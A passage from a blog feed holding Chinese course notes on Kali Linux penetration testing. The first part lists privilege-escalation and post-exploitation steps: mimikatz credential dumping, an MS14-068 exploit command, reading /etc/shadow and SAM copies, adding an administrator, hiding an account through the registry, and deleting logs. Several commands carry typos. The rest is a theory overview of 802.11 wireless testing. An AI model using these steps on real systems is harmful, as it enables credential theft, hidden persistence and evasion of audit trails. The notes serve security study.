bash</li><li>从内存读取LM/NLTM hash</li><li>Digest AAUTHENTICATION Package</li><li>NLTM Security Package</li><li>Kerberos Security Package</li><li>防止WCE攻击<blockquote><p>其他工具</p><ul><li>pwdump localhost</li><li>fgdump</li><li>mimikatz<ul><li>privilege::debug # 提升权限</li><li>sekulsa::logonPasswords<br>利用漏洞提权</li></ul></li></ul></blockquote></li><li>MS 11-80 漏洞  ( 单机漏洞提取)<ul><li>Ms 11-080 (11 年第80个漏洞)—&gt; 中文版本会产生dos(拒绝服务攻击)</li><li>Kb2592799<ul><li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li></ul></li><li>Pyinstaller</li><li>Pywin32</li><li>MS11-046<ul><li>DoS</li></ul></li></ul></li><li>MS14-068 漏洞  (获得域的管理员权限 操控多台计算机)<ul><li>库<ul><li><a href="http://github.com/bidord/pykel" target="_blank" rel="noopener">http://github.com/bidord/pykel</a></li></ul></li><li>ms14-068.py -u <a href="mailto:user@lab.com" target="_blank" rel="noopener">user@lab.com</a> -s userSID -d dc.lab.com</li><li>拷贝 TGT_user1@ lab.com cache到windos系统</li><li>本地管理员登录<ul><li>mimkatz.exe </li></ul></li></ul></li><li>CVE-2012-0056 (Linux OS 漏洞)<ul><li>/proc/pid/mem  (进程权限控制不严格)</li><li>kernels&gt;2.6.39</li><li><a href="http://blog.zx2c4.com/749" target="_blank" rel="noopener">http://blog.zx2c4.com/749</a><blockquote><p>利用配置不当提权</p><ul><li>与漏洞提取相比 更常用的方法</li><li>企业环境</li><li>补丁更新的全部已经安装</li><li>输入变量过滤之外更值得研发关注的安全隐患</li><li>以system的权限启动</li><li>NTFS权限允许users修改删除</li><li>icals</li><li>icals c:\windows*.exe /save perm /T</li><li>Find</li><li>find / -perm 777 -execls -l {} ; </li><li>应用系统的配置文件</li><li>应用连接数据库的配置文件</li><li>后台服务运行账号<br>基本信息收集</li><li>Linux</li></ul></blockquote></li><li>/etc/resolv.conf</li><li>/etc/passwd</li><li>/etc/shadow   (保存有密码)</li><li>whoami,who -a</li><li>ifconfig -a iptables -L -n,netstat -rn</li><li>uname -a,ps aux</li><li>dpkg -l | head<ul><li>Windows</li></ul></li><li>ipconfig / all, ipconfig/displaydns netstat -bnao,netstat -r</li><li>net view,netview /domain</li><li>net user/domain </li><li>net accounts,net share</li><li>net localgroup administarators username /add</li><li>net group “Domain Controlleds” /domain<blockquote><p>WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)&lt;—强大功能</p><ul><li>wmic nicconfig get ipaddress,nacadess</li><li>wmic computersystem get username<br>收集敏感信息</li><li>商业信息</li><li>系统信息</li><li>Linux</li><li>/etc ; /usr/local/etc</li><li>/etc/pass ; /etc/shadow</li><li>.ssh ; .gnupg 公私钥</li><li>The e-mail and data file</li><li>业务数据库 ; 身份认证服务器数据库</li><li>/tmp</li><li>Windows</li><li>SAM 数据库 ; 注册表文件</li><li>%SYSTEMROOT%\repair\SAM  (存放SAM副本)</li><li>%SYSTEMROOTS%\System32\config\RegBack\SAM  (存放SAM副本)</li><li>业务数据库 ; 身份认证数据库</li><li>临时文件目录<br>隐藏痕迹</li><li>禁止在登录界面显示新建账号</li><li>REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windoes NT\CurrentVersion\WinLogon\SpecialAccounts\UserList” /v uname /T<br>REG_SWORD/D 0   (隐藏账号)</li><li>del %WINDIR%*.log /a/s/q/f</li><li>History</li><li>日志</li></ul></blockquote></li><li>auth.log / secure</li><li>btmp / wtmp</li><li>lastlog / faillog<ul><li>其他日志和HIDS等</li></ul></li></ul></li></ul><h2 id="Kali-Linux-从入门到精通-十一-–无线渗透测试"><a href="#Kali-Linux-从入门到精通-十一-–无线渗透测试" class="headerlink" title="Kali Linux 从入门到精通(十一)–无线渗透测试"></a>Kali Linux 从入门到精通(十一)–无线渗透测试</h2><blockquote><p>1.无线渗透概述</p><ul><li>与其他章节独立,涵盖面广,可独立成课</li><li>无线技术变化块,难度大</li><li>既新鲜刺激 难度大<ul><li>不会研究很深</li></ul></li><li>半理论,半实践<ul><li>理论是本章最有价值的部分(aircrack-ng suite 作者写的一本书)</li></ul></li><li>无线技术是本课程难度最大的一章<ul><li>协议结构<br>2.无线技术特点</li></ul></li><li>行业迅猛发展</li><li>互联网的重要入口</li><li>边界模糊</li><li>安全实施缺失而且困难</li><li>对技术不了解而造成配置不当</li><li>企业网络私自接入AP破坏网络边界<br>3.IEEE:Institute of Elecrical and Electronics Engineers</li><li>IEEE分为不同的技术委员会,其中802委员会负责lan,man的制定<ul><li>以太网</li><li>令牌环网</li><li>无线局域网</li><li>网桥<br>4.无线(802.11)</li></ul></li><li>数据链路层<ul><li>LLC</li><li>MAC</li></ul></li><li>物理层</li><li>IEEE 802.11 标准<br>图片1<br>图片4<br>802.11b<br>802.11A<br>802.11G</li><li>无线<br>图片2</li><li>日常使用<br>图片3<br>5.无线网络运行模式</li><li>无线网络架构 (两种半方式)</li><li>a. Infrasture (基础架构型)<ul><li>AP 维护SSID(服务级标识符–即无线名)</li><li>至少包含一个AP和一个STATION,形成一个Basic Service Set(BSS) 基本服务集</li><li>AP连接到有线网络,称为Distribution System(DS)</li><li>连接到同一个DS的多个AP形成一个Extended Service Set(ESS)</li></ul></li><li>b. Ad-Hoc<ul><li>STA 维护SSID</li><li>也被称为Independent Basic Service Set(IBSS)</li><li>有至少两个STAs直接通信组成</li><li>也称为peer to peer模式</li><li>其中一个STA负责AP的工作<ul><li>通过beacon广播SSID</li><li>对其他STAs进行直接身份验证</li></ul></li></ul></li><li>Service Set Identifier(SSID)<pre><code>- AP每秒钟约10次通过Beacon帧广播SSID- 客户端连接到无线网络后也会宣告SSID  </code></pre></li><li>WIRELESS DISTRIBUTION SYSTEM(WDS)<ul><li>与有限DS类似,只是通过无线连接的多个AP组成的网络<ul><li>Bindging(桥接方式)-只有AP间彼此通信</li><li>Repeating(中继方式)-只允许所有AP和STA进行通信</li></ul></li></ul></li><li>c.MONITOR MODE(类似于有线网络的混杂模式,可抓住其他机器的流量)<ul><li>Monitor 不是一种真的无线模式<ul><li>但是对无线渗透至关重要</li><li>允许无线网卡没有任何筛选的抓包(802.11包头)</li><li>与有线网络的混杂模式可以类比</li><li>审核的网卡和驱动不但可以monitor,更可以Injection</li></ul>6.无线网络硬件设备及基本概念<ul><li>物理机运行kali</li><li>虚拟机运行kali</li><li>外置USB 无线网卡</li><li>TL-WN722N(个人建议)</li><li>dmseg</li><li>iwconfig</li></ul>7.选择无线网卡</li></ul></li><li>这是个痛苦和受挫的过程</li><li>无线网卡的芯片和型号是成败的关键</li><li>台式机:<ul><li>USB 无线卡 (不支持扩展天线)</li><li>PCMCIA(16 bit 已停产)</li><li>Cardbus(32 bit PCMCIA 8.0标准)</li><li>Express Cards</li><li>MiniPCI</li><li>MiniPCI Express</li></ul></li><li>发送功率:远程连接</li><li>接收灵敏:适当降低灵敏度,接收效果更佳</li><li>经验但不是铁律<ul><li>或 Realtek 芯片</li><li>没有神器</li><li>兼容 aircrack-ng suite</li><li><a href="http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatiable_adapters" target="_blank" rel="noopener">http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatiable_adapters</a></li></ul></li><li>无线渗透网卡没有所谓标准,但是Aircrack-ng suite 作者给出建议</li><li>Alfa Networks AWUS036H 无线网卡<br>8.无线技术概念</li></ul></blockquote><p>截图</p><blockquote><p>9.Linux无线协议栈及配置命令</p></blockquote><p>截图</p><blockquote><p>10.RADIOTAP头</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;作为渗透测试的第一篇文章,本文主要将带领你进行基础的渗透测试学习,若想要进一步学习可参考更多渗透测试以及黑客入侵与防御书籍&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="信息安全" scheme="https://Roooooooooooooooookie.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="渗透测试" scheme="https://Roooooooooooooooookie.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Kali Linux大法" scheme="https://Roooooooooooooooookie.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Kali-Linux%E5%A4%A7%E6%B3%95/"/>
    
    
      <category term="渗透测试" scheme="https://Roooooooooooooooookie.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="信息安全" scheme="https://Roooooooooooooooookie.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
